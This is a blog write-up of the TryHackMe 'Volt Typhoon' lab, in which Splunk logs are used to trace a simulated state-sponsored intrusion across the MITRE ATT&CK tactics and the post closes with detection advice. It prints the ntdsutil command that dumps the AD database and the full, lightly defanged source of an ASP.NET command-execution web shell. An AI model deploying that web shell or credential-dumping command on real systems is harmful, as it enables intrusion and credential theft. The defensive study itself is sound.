---
layout: post
title: "TryHackMe - 'Volt Typhoon' Walkthrough - Medium"
date: 2025-12-29
description: "A guided walkthrough of the TryHackMe lab/room called Volt Typhoon. Investigating Splunk logs to track the APT's tactics, techniques and procedures leveraging the MITRE ATT&CK framework."
category: write-ups
image: '/assets/images/Labs/volt-typhoon-lab/VT-cover-image.png'
tags: [labs, educational, blue-team]
---

# TryHackMe Lab Walkthrough: Hunting Volt Typhoon with Splunk

## Introduction

In this TryHackMe lab, we step into the shoes of a SOC analyst investigating a suspected intrusion by **Volt Typhoon** (MITRE ATT&CK Group ID: [G1017](https://attack.mitre.org/groups/G1017/)), a People's Republic of China (PRC) state-sponsored threat actor that has been active since at least 2021. Volt Typhoon primarily targets critical infrastructure organizations in the United States and its territories, with a pattern of behavior assessed as pre-positioning for potential disruptive attacks against operational technology (OT) assets.

What makes Volt Typhoon particularly dangerous is their emphasis on stealth through **Living Off the Land (LOTL)** techniques—using legitimate system tools like `wmic`, `ntdsutil`, `netsh`, and `PowerShell` to blend in with normal administrative activity. This makes detection significantly more challenging for defenders.

**Lab Scenario:** The SOC has detected suspicious activity indicative of an APT intrusion. We've been provided with various log types from a two-week timeframe during which the suspected attack occurred. Our mission is to retrace the attacker's steps using Splunk.

**Key Resources to Reference:**
- MITRE ATT&CK Volt Typhoon Profile: https://attack.mitre.org/groups/G1017/
- CISA Advisory AA24-038A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a

---

## Initial Access (TA0001)

**MITRE ATT&CK Techniques:**
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

Volt Typhoon frequently gains initial access by exploiting vulnerabilities in internet-facing enterprise software. In real-world incidents, they've been observed leveraging vulnerabilities in products like Zoho ManageEngine ADSelfService Plus, Fortinet FortiGuard, Ivanti (Pulse Secure), and Citrix appliances.

### Question 1: At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?

To begin our investigation, we need to comb through the ADSelfService Plus logs:

1. Add the filter `adselfserviceplus` to our Splunk query to isolate these logs.
2. The question points us toward user Dean, so we examine the 'interesting fields' section and drill into the 'username' field.
3. We find `dean-admin` in the list of usernames. Clicking this creates our filter: `adselfserviceplus username="dean-admin"`, which returns 63 logs.

![](/assets/images/Labs/volt-typhoon-lab/VT-0.5.png)

Looking through these logs, we see several 'Password Reset' and 'Password Change' events. To narrow it down, I looked for unique events that stood out—specifically an 'Account Update' event with a single count that appeared suspicious.

![](/assets/images/Labs/volt-typhoon-lab/VT-1.png)

Examining the timeline around this Account Update, we find a Password Change log immediately *before* it—this gives us our ISO 8601 timestamp for the initial compromise.

### Question 2: Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?

Using the timestamp from our previous finding, we can refine our search. Adding the day of the event to keep things somewhat broad: `adselfserviceplus username="dean-admin" date_mday="24"`

This only shows activity from Dean on that specific day. Since a new account creation may not show `dean-admin` as the acting user, we broaden our search by removing the username filter while keeping the timestamp context.

Scrolling past our initial access timestamp, we find the answer—the next log shows an 'Enrollment' action for a new user on the system.

![](/assets/images/Labs/volt-typhoon-lab/VT-1.5.png)

---

## Execution (TA0002)

**MITRE ATT&CK Techniques:**
- [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
- [T1059.001 - Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [T1059.003 - Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- [T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)

Volt Typhoon heavily exploits Windows Management Instrumentation Command-line (WMIC) for execution, information gathering, and database dumping. By using these built-in "LOLBins" (Living Off the Land Binaries), they blend in with legitimate system activity, making detection extremely challenging.

### Question 1: In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?

First, we filter our search to WMIC logs: `index="main" sourcetype=wmic`

This returns a significant amount of legitimate traffic with many repeated commands. To identify anomalies, I clicked the 'command' field and selected 'Rare values' to surface unique commands.

![](/assets/images/Labs/volt-typhoon-lab/VT-2.png)

This creates the filter `index="main" sourcetype=wmic| rare limit=20 command` and displays a visualization of unique commands.

![](/assets/images/Labs/volt-typhoon-lab/VT-2.2.png)

Several commands stand out immediately. One in particular queries `logicaldisk` information from both `server01` *and* `server02`—a classic reconnaissance pattern.

![](/assets/images/Labs/volt-typhoon-lab/VT-2.4.png)

![](/assets/images/Labs/volt-typhoon-lab/VT-2.5.png)

Note that the attacker is still leveraging the compromised `dean-admin` account a full day after initial access to execute commands and enumerate the environment.

### Question 2: The attacker uses `ntdsutil` to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?

To search for `ntdsutil.exe` execution, I experimented with different search queries including PowerShell and WMIC logs. Eventually, simply adding `"ntdsutil.exe"` to the search query narrowed it down to one log:

![](/assets/images/Labs/volt-typhoon-lab/VT-2.6.png)

This reveals that `dean-admin` used WMIC to spawn `cmd.exe`, create a temp directory under `C:\Windows\Temp\tmp`, and then execute:
```
ntdsutil.exe "ac i ntds" "ifm create full C:\Windows\Temp\tmp\temp.dit"
```

Breaking this down:
- `ac i ntds` - Activates the NTDS instance, preparing the utility to work with the main Active Directory database
- `ifm` (Install From Media) - Creates a full copy of the AD database files, containing all usernames and password hashes

This is a critical credential access technique that Volt Typhoon uses to obtain domain credentials for offline cracking.

With the timestamp established, we can refine our search: `index="main" "server-02-main" username="dean-admin" timestamp="2024-03-25*"`

This gives us 15 events to examine. The most recent event reveals the attacker using 7-Zip to compress the database file with a password.

![](/assets/images/Labs/volt-typhoon-lab/VT-2.8.png)

---

## Persistence (TA0003)

**MITRE ATT&CK Techniques:**
- [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)

Web shells are a hallmark of Volt Typhoon operations. They provide persistent backdoor access while appearing as legitimate web server files.

### Question 1: To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?

To find evidence of Base64-encoded persistence mechanisms, we need to focus on keywords commonly used with encoded commands. Base64 strings themselves are just text blobs without identifiable patterns, but the commands that decode them are recognizable.

I tried various search terms including `"certutil -decode"`, `"FromBase64String"`, and file extensions like `".php"` and `".jsp*"`. Some returned interesting results but not exactly what we needed.

Adding a broader search for `"echo"` statements revealed encoded text—exactly what we're looking for.

![](/assets/images/Labs/volt-typhoon-lab/VT-3.2.png)

This gives us the directory used to establish the web shell.

Decoding the Base64 payload with CyberChef reveals the script (defanged):

```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System[.]Diagnostics" %>
<%@ Import Namespace="System[.]IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi[.]FileName = "cmd[.]exe";
psi[.]Arguments = "/c "+arg;
psi[.]RedirectStandardOutput = true;
psi[.]UseShellExecute = false;
Process p = Process[.]Start(psi);
StreamReader stmrdr = p[.]StandardOutput;
string s = stmrdr[.]ReadToEnd();
stmrdr[.]Close();
return s;
}
void cmdExe_Click(object sender, System[.]EventArgs e)
{
Response[.]Write("<pre>");
Response[.]Write(Server[.]HtmlEncode(ExcuteCmd(txtArg[.]Text)));
Response[.]Write("</pre>");
}
</script>
```

**Malicious Components Explained:**
- **`ProcessStartInfo`** — Configures how to spawn a new process
- **`FileName = "cmd.exe"`** — Executes Windows command prompt
- **`Arguments = "/c "+arg`** — The `/c` flag runs whatever command the attacker supplies, then terminates
- **`RedirectStandardOutput = true`** — Captures command output to display back to the attacker
- **`UseShellExecute = false`** — Required for output redirection to work
- **`StreamReader`** — Reads all output from the executed command and returns it as a string

This is a classic ASP.NET web shell known as **"Awen"**—a simple but effective command execution backdoor that Volt Typhoon has been observed using in real-world operations.

---

## Defense Evasion (TA0005)

**MITRE ATT&CK Techniques:**
- [T1070.001 - Indicator Removal: Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/)
- [T1070.007 - Indicator Removal: Clear Network Connection History and Configurations](https://attack.mitre.org/techniques/T1070/007/)
- [T1036.008 - Masquerading: Masquerade File Type](https://attack.mitre.org/techniques/T1036/008/)
- [T1497.001 - Virtualization/Sandbox Evasion: System Checks](https://attack.mitre.org/techniques/T1497/001/)

Volt Typhoon is meticulous about covering their tracks. They selectively clear logs, rename malicious files, and check for virtualized environments that might indicate sandbox analysis.

### Question 1: In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the "Most Recently Used" record?

Using context clues from the question, we know to look for "Most Recently Used" RDP connection records. A quick search reveals these are stored in registry keys with naming conventions like `MRU0`, `MRU1`, etc.

![](/assets/images/Labs/volt-typhoon-lab/VT-4.png)

Adding this to our search query: `index="main" sourcetype=powershell "MRU*"`

![](/assets/images/Labs/volt-typhoon-lab/VT-4.2.png)

This reveals the PowerShell cmdlet used to delete RDP connection history.

### Question 2: The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?

Returning to our Execution section findings—the attacker compressed `C:\Windows\Temp\tmp\temp.dit` with 7-Zip. Searching for `.7z` shows what else was done with this archive.

![](/assets/images/Labs/volt-typhoon-lab/VT-4.4.png)

The attacker renamed the archive and changed its extension to `.gif` to disguise the exfiltrated AD database as an innocuous image file.

### Question 3: Under what regedit path does the attacker check for evidence of a virtualized environment?

Volt Typhoon routinely checks for virtualization indicators to determine if they're operating in a sandbox or analyst environment. A search for common virtualization registry paths provides our lead.

![](/assets/images/Labs/volt-typhoon-lab/VT-4.6.png)

Searching with `index="main" "HKEY_LOCAL_MACHINE*"` reveals the registry path being queried:

![](/assets/images/Labs/volt-typhoon-lab/VT-4.8.png)

---

## Credential Access (TA0006)

**MITRE ATT&CK Techniques:**
- [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

Volt Typhoon aggressively hunts for credentials using both registry queries and memory-based credential dumping tools like Mimikatz.

### Question 1: Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?

Adding `"reg"` to our PowerShell search query: `index="main" sourcetype="powershell" "reg"`

This returns 8 events that include three key pieces of software known to store credentials:
- **OpenSSH** - May contain SSH keys and connection information
- **PuTTY** - Stores session configurations and potentially saved credentials
- **RealVNC** - Remote access tool with stored authentication data

### Question 2: What is the full decoded command the attacker uses to download and run mimikatz?

Initial searches for `Invoke-WebRequest` didn't return useful results. I then looked for common PowerShell obfuscation flags. Remembering that `-ExecutionPolicy Bypass` can be shortened to `-exec bypass`, I updated the search: `index="main" sourcetype=powershell "-exec"`

This revealed a highly suspicious command with encoded Base64 payload:
- `-exec bypass` - Bypasses PowerShell script execution restrictions
- `-W hidden` - Runs PowerShell with no visible window (stealth)
- `-nop` - Skips loading the user's PowerShell profile
- `-E` - Indicates the following string is Base64-encoded PowerShell

![](/assets/images/Labs/volt-typhoon-lab/VT-5.2.png)

Decoding with CyberChef reveals the command to download and execute Mimikatz, which then dumps credentials from an LSASS memory dump.

---

## Discovery (TA0007) & Lateral Movement (TA0008)

**MITRE ATT&CK Techniques:**
- [T1654 - Log Enumeration](https://attack.mitre.org/techniques/T1654/)
- [T1570 - Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/)

### Question 1: The attacker uses `wevtutil`, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?

Searching for `wevtutil` activity: `index="main" wevtutil`

To filter for Event ID queries specifically: `index="main" wevtutil "EventID"`

![](/assets/images/Labs/volt-typhoon-lab/VT-6.png)

The Event IDs being searched are significant:
- **4624** - Successful logon to a computer (identifying active accounts)
- **4625** - Failed logon attempt (potential targets or password spraying evidence)
- **4769** - Kerberos Service Ticket (TGS) request (Kerberoasting indicators)

### Question 2: Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?

Returning to our Persistence findings, the original web shell was named `ntuser.ini`. Searching for this file: `index="main" "ntuser.ini"`

This returns two events. The latest shows `ntuser.ini` being decoded with `certutil` and renamed to `iisstart.aspx` about five minutes after initial creation.

![](/assets/images/Labs/volt-typhoon-lab/VT-6.5.png)

With this breadcrumb, we search for lateral movement to `server-02`: `index="main" "server-02" "iisstart.aspx"`

![](/assets/images/Labs/volt-typhoon-lab/VT-6.7.png)

This reveals the name of the new web shell deployed on the secondary server.

---

## Collection (TA0009)

**MITRE ATT&CK Techniques:**
- [T1005 - Data from Local System](https://attack.mitre.org/techniques/T1005/)
- [T1074.001 - Data Staged: Local Data Staging](https://attack.mitre.org/techniques/T1074/001/)

### Question 1: The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?

To view files copied via PowerShell, we search for the `Copy-Item` cmdlet: `index="main" sourcetype=powershell "Copy-Item"`

![](/assets/images/Labs/volt-typhoon-lab/VT-7.png)

This returns 11 events revealing financial documents copied from `C:\ProgramData\FinanceBackup\`—exactly the kind of sensitive data APTs target for espionage purposes.

---

## C2 (Command and Control) (TA0011) & Cleanup

**MITRE ATT&CK Techniques:**
- [T1090.001 - Proxy: Internal Proxy](https://attack.mitre.org/techniques/T1090/001/)
- [T1070.001 - Indicator Removal: Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/)

### Question 1: The attacker uses `netsh` to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?

We can search for `netsh` directly: `index="main" "netsh"`

Or use knowledge of proxy configuration syntax: `index="main" connectaddress=*`

![](/assets/images/Labs/volt-typhoon-lab/VT-8.png)

Either approach reveals the proxy's connect address and port used for command and control.

### Question 2: To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?

First, I checked for PowerShell log clearing with `Clear-EventLog`—no results. Then I searched for `Get-WinEvent` queries, which returned some events but no evidence of clearing.

Remembering that `wevtutil` was used earlier for log enumeration, I searched: `index="main" sourcetype=powershell wevtutil`

![](/assets/images/Labs/volt-typhoon-lab/VT-8.8.png)

The most recent event shows `wevtutil cl` (clear) followed by the four log types that were wiped to cover the attacker's tracks.

---

## Conclusion

This investigation walked through the complete attack chain of a Volt Typhoon-style intrusion, from initial exploitation of ADSelfService Plus through data collection and C2 cleanup. Key takeaways for defenders:

**Detection Opportunities:**
1. **Monitor LOLBin abuse** - Unusual `wmic`, `ntdsutil`, `netsh`, and PowerShell activity from unexpected users
2. **Watch for NTDS.dit access** - Any `ntdsutil ifm` commands are high-priority alerts
3. **Track web shell indicators** - Base64-encoded payloads, `certutil -decode` commands, and suspicious `.aspx`/`.jspx` files
4. **Correlate authentication events** - Mass queries for Event IDs 4624/4625/4769 indicate reconnaissance
5. **Monitor log clearing** - `wevtutil cl` commands are a strong indicator of cover-up activity

**Key Volt Typhoon Characteristics:**
- Heavy reliance on built-in Windows tools (Living Off the Land)
- Patient, methodical approach with multi-day dwell times
- Focus on credential harvesting and AD database theft
- Extensive use of web shells for persistence
- Thorough operational security including log clearing and file renaming

For more information on Volt Typhoon TTPs, reference the MITRE ATT&CK page for [G1017](https://attack.mitre.org/groups/G1017/) and CISA Advisory [AA24-038A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a).